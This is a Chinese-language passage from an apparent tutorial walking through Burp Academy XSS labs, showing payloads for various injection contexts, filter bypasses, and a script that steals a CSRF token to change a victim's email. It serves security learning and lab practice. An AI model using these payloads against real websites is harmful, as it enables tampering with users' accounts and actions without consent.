### <a class="reference-link" name="%E5%88%A9%E7%94%A8XSS%E5%8F%91%E5%8A%A8CSRF"></a>利用XSS发动CSRF

burp将CSRF专题放在本专题后面，所以到后面再详细讲解CSRF，现在我们只讲解这种XSS利用手段，前面有介绍过，XSS可以用来执行受害者能执行的任何操作，包括发送好友请求、转移用户资产、修改身份信息等。这种借他人之手执行的操作就是CSRF，虽然有一些应用程序会通过引入防CSRF攻击令牌的方式进行缓解，但是如果可以利用XSS窃取到该令牌，则这种缓解措施也会随即失效，下面我们同样是通过一道靶场来深入理解。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8XSS%E5%8F%91%E5%8A%A8CSRF"></a>配套靶场：利用XSS发动CSRF

首先我们利用提供的账号登录，然后找到修改邮箱的请求包，发现主体有两个参数email和csrf，所以我们需要构造payload获取csrf才能成功利用XSS发动CSRF，例如

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d3c8e1c52fb55d60.png)

```
&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/email',true);
    req.send();
    function handleResponse() `{`
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        changeReq.open('post', 'email/change-email', true);
        changeReq.send('csrf='+token+'&amp;email=test@test.com')
    `}`;
&lt;/script&gt;
```

当用户触发了这个XSS的时候就会发动CSRF修改邮箱为指定邮箱了，因为这道靶场修改邮箱不需要验证任何东西

[![](https://p1.ssl.qhimg.com/t015122f6f105ab4a40.png)](https://p1.ssl.qhimg.com/t015122f6f105ab4a40.png)

### <a class="reference-link" name="%E9%80%9A%E8%BF%87XSS%E4%B8%8A%E4%B8%8B%E6%96%87%E6%8E%A2%E6%B5%8B%E5%8F%8D%E5%B0%84%E5%9E%8B%E5%92%8C%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"></a>通过XSS上下文探测反射型和存储型XSS漏洞

为了探测反射型和存储型XSS漏洞，我们通常是在任何可以的入口点随便输入一个字符串，然后观察其反馈在响应中位置的上下文，基于不同情况的上下文可以选择不同种类的payload，这里burp提供了一个非常强大的[XSS payload宝典](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)。burp将上下文分为以下几种
- 在HTML标签中的XSS
- 在HTML标签属性中的XSS
- JS中的XSS
下面我们从以上三个小节来分别介绍

### <a class="reference-link" name="%E5%9C%A8HTML%E6%A0%87%E7%AD%BE%E4%B8%AD%E7%9A%84XSS"></a>在HTML标签中的XSS

这种上下文是最常见的，我们只需要引入一些可以执行JS的HTML标签即可，例如

```
&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;img src=1 onerror=alert(1)&gt;
```

下面我们通过几道靶场来深入理解

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA1%EF%BC%9A%E5%A4%A7%E9%83%A8%E5%88%86%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场1：大部分标签和属性被禁用的HTML上下文中的反射型XSS

因为题目说禁用了大部分的标签和属性，所以我们需要做一个fuzz测试，于是我们将搜索的包发到Intruder，设置变量位

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f4f125d286a772d8.png)

然后我们到前面提到的XSS payload宝典复制标签列表

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a9f0d56454204917.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0147259970e9297186.png)

可以看到一共157个标签，开始fuzz

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013f9e2930e122e3f0.png)

好家伙，只有一个标签是没有被禁用的，接着我们开始fuzz可用的属性

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016be4ccfa7ddb7789.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d684a31e133dcfa0.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0145294cda9969ed12.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011026ac2bd36b3665.png)

好，我们也是只的到一个可用的属性onresize，于是我们可以这样构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d604113bab904c28.png)

经过两次fuzz测试成功构造可以触发XSS的payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b8e0c25738211957.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA2%EF%BC%9A%E9%99%A4%E4%BA%86%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE%E5%A4%96%E7%9A%84%E5%85%A8%E9%83%A8%E6%A0%87%E7%AD%BE%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84HTML%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场2：除了自定义标签外的全部标签被禁用的HTML上下文中的反射型XSS

因为禁用了所有的标签，所以我们只能使用自定义标签了，于是我们这样构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011822a38ed7137478.png)

因为自定义标签是没有被禁用的，所以我们又可以成功触发XSS了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ca978079bc328b5d.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA3%EF%BC%9A%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E5%99%A8%E5%92%8C%E5%B1%9E%E6%80%A7href%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场3：事件处理器和属性href被禁用的反射型XSS

题目说题目设置了一些白名单标签，并且禁用了所有的事件和锚点href属性，所以我们还是要fuzz看一下有哪些白名单标签

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017f0119fa6c53d159.png)

虽然有很多个标签都在白名单中，但是查阅了XSS payload宝典以后发现只有一种payload可以使用

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01cef4f6dc6680f394.png)

于是我们这样构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e27e3da1c380eea7.png)

然后点击”Click Me”触发XSS

[![](https://p2.ssl.qhimg.com/t0150774f43dcc3bd9f.png)](https://p2.ssl.qhimg.com/t0150774f43dcc3bd9f.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA4%EF%BC%9A%E5%85%81%E8%AE%B8%E4%B8%80%E4%BA%9BSVG%E6%A0%87%E8%AE%B0%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场4：允许一些SVG标记的反射型XSS

同样的，因为不知道哪些标记允许，所以我们还是要fuzz一下

[![](https://p0.ssl.qhimg.com/t01a0d0a992f6352f82.png)](https://p0.ssl.qhimg.com/t01a0d0a992f6352f82.png)

得知这些标签是允许的，然后再fuzz可用的事件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t015884d5d780a5f02e.png)

接下来就可以构造payload了

[![](https://p0.ssl.qhimg.com/t01c094d631b6530da3.png)](https://p0.ssl.qhimg.com/t01c094d631b6530da3.png)

这样就可以触发XSS了

[![](https://p1.ssl.qhimg.com/t013392fe7488cb1a0c.png)](https://p1.ssl.qhimg.com/t013392fe7488cb1a0c.png)

### <a class="reference-link" name="%E5%9C%A8HTML%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E4%B8%AD%E7%9A%84XSS"></a>在HTML标签属性中的XSS

如果上下文在HTML标签属性中，我们可以通过提前闭合标签然后引入新标签的方式触发XSS。例如<br>`"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;`<br>
如果尖括号被禁用或者编码处理，我们可以通过引入事件触发XSS。例如<br>`" autofocus onfocus=alert(document.domain) x="`<br>
还有一些特殊情况，比如上下文在锚点href中，可以利用JS伪协议触发XSS。例如<br>`&lt;a href="javascript:alert(document.domain)"&gt;`<br>
还有一种方法是很特殊的，它不会自动触发，而是当监控到键入了某个键盘组合才会触发，所以更为隐蔽。下面我们通过几道靶场来深入理解上述情况

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA1%EF%BC%9A%E5%B0%96%E6%8B%AC%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81%E7%9A%84%E5%B1%9E%E6%80%A7%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场1：尖括号被HTML编码的属性中的反射型XSS

因为尖括号会被HTML编码，所以我们在XSS payload宝典中查找适用于input标签的不需要尖括号就能触发XSS的payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0159ccb2a1a927723a.png)

因为我们观察到输入内容会被自动包裹在一对双引号中，所以我们利用前后各一个双引号抵消掉它们

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0144e2664c89081429.png)

这样就可以成功触发XSS了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e5e7fddf62fb230a.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA2%EF%BC%9A%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81%E7%9A%84%E9%94%9A%E7%82%B9href%E5%B1%9E%E6%80%A7%E4%B8%AD%E7%9A%84%E5%AD%98%E5%82%A8%E5%9E%8BXSS"></a>配套靶场2：双引号被HTML编码的锚点href属性中的存储型XSS

经过查找，发现评论提交点中会把网址一栏的内容套在href中，所以我们可以利用JS伪协议构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012e6c9a797af55d7c.png)

这样就可以触发XSS了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016a8baf31755a9284.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA3%EF%BC%9A%E8%A7%84%E8%8C%83%E9%93%BE%E6%8E%A5%E6%A0%87%E7%AD%BE%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场3：规范链接标签中的反射型XSS

题目提示这种攻击方法只能在chrome中生效，然后我们在XSS payload宝典中搜索关键词(canonical)，找到这两条payload

[![](https://p4.ssl.qhimg.com/t0105b7cb0a6096b22b.png)](https://p4.ssl.qhimg.com/t0105b7cb0a6096b22b.png)

所以我们这样构造payload

[![](https://p2.ssl.qhimg.com/t010448717054b90749.png)](https://p2.ssl.qhimg.com/t010448717054b90749.png)

这里我们设置的快捷键为X键，但是不同操作系统的快捷键组合不太一样，例如

```
Windows: ALT+SHIFT+X
MacOS: CTRL+ALT+X
Linux: Alt+X
```

按下对应的快捷键以后就会触发XSS了

[![](https://p4.ssl.qhimg.com/t01c021a775d57a865f.png)](https://p4.ssl.qhimg.com/t01c021a775d57a865f.png)

### <a class="reference-link" name="JS%E4%B8%AD%E7%9A%84XSS"></a>JS中的XSS

当上下文在JS中时，我们需要用不同的手段来触发XSS，有这样几种手段
- 终止现存的脚本
- 逃逸出JS字符串
- 利用HTML编码
- JS模板文字中的XSS
### <a class="reference-link" name="%E7%BB%88%E6%AD%A2%E7%8E%B0%E5%AD%98%E7%9A%84%E8%84%9A%E6%9C%AC"></a>终止现存的脚本

和之前的手段类似，当上下文在script标签中时，我们需要先提前闭合掉script标签，然后再插入XSS payload。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%A2%AB%E8%BD%AC%E4%B9%89%E7%9A%84JS%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场：单引号和反斜杠被转义的JS中的反射型XSS

我们先观察一下查询后的上下文

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017cad80434c8e458a.png)

然后我们这样构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01645a6a1bc5b2110d.png)

经过这么一提前闭合，上下文的JS就失效了，然后我们插入的新的JS就可以触发XSS了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01517bd30afccefa24.png)

### <a class="reference-link" name="%E9%80%83%E9%80%B8%E5%87%BAJS%E5%AD%97%E7%AC%A6%E4%B8%B2"></a>逃逸出JS字符串

如果上下文是单引号的情况下，可以利用一些手段逃逸出来直接执行JS，例如

```
'-alert(document.domain)-'
';alert(document.domain)//

```

有的应用程序会通过添加反斜杠的方式将其中的单引号转义，但是单引号并不会被转义，所以我们可以再添加一个反斜杠抵消掉它的转义作用，比如我们输入<br>`';alert(document.domain)//`<br>
被系统转义后变成了<br>`\';alert(document.domain)//`<br>
但是如果我们将输入改成<br>`\';alert(document.domain)//`<br>
被系统处理以后就变成了<br>`\\';alert(document.domain)//`<br>
再一次成功逃逸出来触发XSS

有的应用程序连括号都不让用，但是还是有办法绕过的，可以使用异常处理事件throw向onerror指定的函数传参以触发XSS，例如<br>`onerror=alert;throw 1`<br>
下面我们通过几个靶场来深入理解上面这些手段

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA1%EF%BC%9A%E5%B0%96%E6%8B%AC%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81%E7%9A%84JS%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场1：尖括号被HTML编码的JS中的反射型XSS

因为尖括号被HTML编码，所以我们需要另辟蹊径，于是我们利用前面讲的利用减号和反斜杠进行逃逸

[![](https://p5.ssl.qhimg.com/t018c6c95bda7678a98.png)](https://p5.ssl.qhimg.com/t018c6c95bda7678a98.png)

[![](https://p5.ssl.qhimg.com/t01309415f0d0d92cf8.png)](https://p5.ssl.qhimg.com/t01309415f0d0d92cf8.png)

[![](https://p4.ssl.qhimg.com/t01e94e9f319ec91db4.png)](https://p4.ssl.qhimg.com/t01e94e9f319ec91db4.png)

以上三种方法都可以成功触发XSS

[![](https://p5.ssl.qhimg.com/t0172a58894f935bc59.png)](https://p5.ssl.qhimg.com/t0172a58894f935bc59.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA2%EF%BC%9A%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81%E5%B9%B6%E4%B8%94%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BD%AC%E4%B9%89%E7%9A%84JS%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场2：尖括号和双引号被HTML编码并且单引号被转义的JS中的反射型XSS

这一道靶场的防护手段还挺多的，但是我们讲过了，只有单引号被转义，所以我们还可以这样构造payload

[![](https://p0.ssl.qhimg.com/t01108b692e4c310032.png)](https://p0.ssl.qhimg.com/t01108b692e4c310032.png)

这样就成功逃逸出来触发XSS了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0171359e33a4cf055b.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA3%EF%BC%9A%E4%B8%80%E4%BA%9B%E5%AD%97%E7%AC%A6%E8%A2%AB%E7%A6%81%E7%94%A8%E7%9A%84JS%20URL%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场3：一些字符被禁用的JS URL中的反射型XSS

因为一些字符被禁用了，所以之前的手段全都失效了，这里官网提供了一款payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a2a5731e90cac547.png)

我们先放到burp里解一下URL编码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012ea8f75b66348ff5.png)

这段payload比较复杂，我们一点点来讲解。它打算使用throw触发XSS，但是空格被禁止了，所以我们利用空白的注释来生成空格。然后又因为throw只有在代码块中才会被执行，所以我们需要创建一个箭头函数。为了能够调用它，我们需要制造一个强制转换字符串引发的报错，所以把箭头参数x再赋给window的toString。而且这段代码只有在返回到首页的时候才会触发。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0199ba11e73c3be955.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8HTML%E7%BC%96%E7%A0%81"></a>利用HTML编码

前面我们遇到HTML编码的情况一般就是选择了放弃，但是还是有些特殊情况的，比如我们的输入会包裹在onclick事件中时，它会对HTML编码进行解码操作，从而触发XSS。下面我们通过一道靶场来深入理解

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81%E5%B9%B6%E4%B8%94%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%A2%AB%E8%BD%AC%E4%B9%89%E7%9A%84onclick%E4%BA%8B%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%AD%98%E5%82%A8%E5%9E%8BXSS"></a>配套靶场：尖括号和双引号被HTML编码并且单引号和反斜杠被转义的onclick事件中的存储型XSS

好家伙，这回防护得太彻底了吧，但是我们发现网址一栏提交以后上下文被包裹在onclick事件中，所以我们可以利用其特性将HTML编码进行解码操作

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019051b52e1641691e.png)

提交以后观察一下效果

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016a6dac5d3757921b.png)

发现真的把之前遇到就会放弃的HTML编码解码了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016c70cba8644f25a8.png)

### <a class="reference-link" name="JS%E6%A8%A1%E6%9D%BF%E6%96%87%E5%AD%97%E4%B8%AD%E7%9A%84XSS"></a>JS模板文字中的XSS

JS模板文字就是可以在反引号包裹的字符串中嵌入JS表达式，其语法像这样<br>`$`{`...`}``<br>
那么嵌入payload的JS模板文字就像这样<br>`$`{`alert(document.domain)`}``

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%B0%96%E6%8B%AC%E5%8F%B7%EF%BC%8C%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E5%92%8C%E5%8F%8D%E5%BC%95%E5%8F%B7%E8%A2%ABUnicode%E8%BD%AC%E4%B9%89%E7%9A%84JS%E6%A8%A1%E6%9D%BF%E6%96%87%E5%AD%97%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场：尖括号，单双引号，反斜杠和反引号被Unicode转义的JS模板文字中的反射型XSS

这么多符号都被Unicode转义了，我们先观察一下上下文是什么样的

[![](https://p2.ssl.qhimg.com/t0160d26919cf3c9aac.png)](https://p2.ssl.qhimg.com/t0160d26919cf3c9aac.png)

发现输入被包裹在反引号中，所以我们可以利用JS模板文字构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01964508e0938156d7.png)

这样就又可以触发XSS了

[![](https://p3.ssl.qhimg.com/t01ad7c7a1009e4ad2c.png)](https://p3.ssl.qhimg.com/t01ad7c7a1009e4ad2c.png)

### <a class="reference-link" name="AngularJS%E6%B2%99%E7%AE%B1"></a>AngularJS沙箱

